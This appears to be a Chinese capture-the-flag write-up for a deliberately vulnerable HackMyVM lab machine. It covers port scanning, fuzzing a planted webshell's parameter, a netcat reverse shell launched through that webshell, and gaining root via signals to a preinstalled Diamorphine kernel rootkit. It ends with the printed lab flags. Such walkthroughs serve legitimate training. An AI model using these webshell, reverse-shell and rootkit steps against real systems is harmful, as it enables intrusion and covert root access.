# Hacked

:::note

[Linux VM] [Tested on VirtualBox] created by || sml

⏲️ Release Date // 2020-11-15

✔️ MD5 // 2ee68492e2ef713a5216abe792aec766

☠ Root // 57

💀 User // 57

📝Notes //
Hack and Fun. Tested on Virtualbox.

:::

## 靶机启动

靶机 IP

```plaintext
192.168.56.116
```

## nmap 信息搜集

```plaintext
Nmap scan report for 192.168.56.116
Host is up (0.00042s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 8d:75:44:05:5f:f8:4f:ac:a1:33:fa:84:03:db:6f:94 (RSA)
|   256 5a:b6:c6:9d:a9:15:42:74:4c:7a:f9:dd:67:ae:75:0e (ECDSA)
|_  256 05:97:3c:74:bd:cf:8d:80:87:05:26:64:7f:d9:3d:c3 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
```

## web 服务

尝试目录扫描

```plaintext
[11:08:42] 200 -   16B  - /index.html
[11:08:57] 200 -   16B  - /robots.txt
[11:09:00] 302 -   62B  - /simple-backdoor.php  ->  /
```

```plaintext title="/secretnote.txt"
[X] Enumeration
[X] Exploitation
[X] Privesc
[X] Maintaining Access.
 |__> Webshell installed.
 |__> Root shell created.

-h4x0r
```

```plaintext title="/simple-backdoor.php"
I modified this webshell to only execute my secret parameter.
```

尝试对 webshell 的参数进行 fuzz

```plaintext title=""
┌─[randark@parrot]─[~]
└──╼ $ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.56.116/simple-backdoor.php?FUZZ=id -fs 62
......
[Status: 302, Size: 115, Words: 12, Lines: 2, Duration: 28ms]
    * FUZZ: secret
```

尝试利用

```bash
┌─[randark@parrot]─[~]
└──╼ $ curl http://192.168.56.116/simple-backdoor.php?secret=whoami
I modified this webshell to only execute my secret parameter.
www-data
```

## User - www-data

```bash
# curl http://192.168.56.116/simple-backdoor.php?secret=nc+192.168.56.102+9999+-e+/bin/bash
┌─[randark@parrot]─[~]
└──╼ $ pwncat-cs -lp 9999
[11:51:03] Welcome to pwncat 🐈!
[11:51:10] received connection from 192.168.56.116:41060
[11:51:11] 192.168.56.116:41060: registered new host w/ db
(local) pwncat$ back
(remote) www-data@hacked:/var/www/html$ whoami
www-data
```

### Diamorphine LKM rootkit

[m0nad/Diamorphine: LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x/6.x (x86/x86_64 and ARM64)](https://github.com/m0nad/Diamorphine)

```bash
(remote) www-data@hacked:/tmp/Diamorphine$ ls -lh
total 32K
-rw-r--r-- 1 www-data www-data 1.5K Feb 18 23:05 LICENSE.txt
-rw-r--r-- 1 www-data www-data  190 Feb 18 23:05 Makefile
-rw-r--r-- 1 www-data www-data 1.7K Feb 18 23:05 README.md
-rw-r--r-- 1 www-data www-data  11K Feb 18 23:05 diamorphine.c
-rw-r--r-- 1 www-data www-data  642 Feb 18 23:05 diamorphine.h
-rw-r--r-- 1 www-data www-data   39 Feb 18 23:09 modules.order
```

:::warning

由于靶机上的 gcc 编译环境有问题，其中 `cc1` 程序不存在于 `PATH` 环境变量中，所以需要进行一定的 patch

```bash
(remote) www-data@hacked:/tmp/Diamorphine$ ln -s /usr/lib/gcc/x86_64-linux-gnu/8/cc1 /tmp/Diamorphine/cc1
(remote) www-data@hacked:/tmp/Diamorphine$ export PATH=/tmp/Diamorphine:$PATH
```

:::

然后开始编译

```bash
(remote) www-data@hacked:/tmp/Diamorphine$ make
make -C /lib/modules/4.19.0-12-amd64/build M=/tmp/Diamorphine modules
make[1]: Entering directory '/usr/src/linux-headers-4.19.0-12-amd64'
  CC [M]  /tmp/Diamorphine/diamorphine.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /tmp/Diamorphine/diamorphine.mod.o
  LD [M]  /tmp/Diamorphine/diamorphine.ko
make[1]: Leaving directory '/usr/src/linux-headers-4.19.0-12-amd64'
```

:::note

失误了，忘记没有 root 权限没办法加载模块到内核。。。

:::

靶机已经部署过 Diamorphine

```bash
(remote) www-data@hacked:/tmp$ kill -63 0
(remote) www-data@hacked:/tmp$ lsmod | grep diamorphine
diamorphine            16384  0
```

## User - root

```bash
(remote) www-data@hacked:/tmp$ kill -64 0
(remote) root@hacked:/tmp$ whoami
root
```

### flag - user

```bash
(remote) root@hacked:/home/h4x0r$ cat user.txt
HMVimthabesthacker
```

### flag - root

```bash
(remote) root@hacked:/root$ cat root.txt
HMVhackingthehacker
```
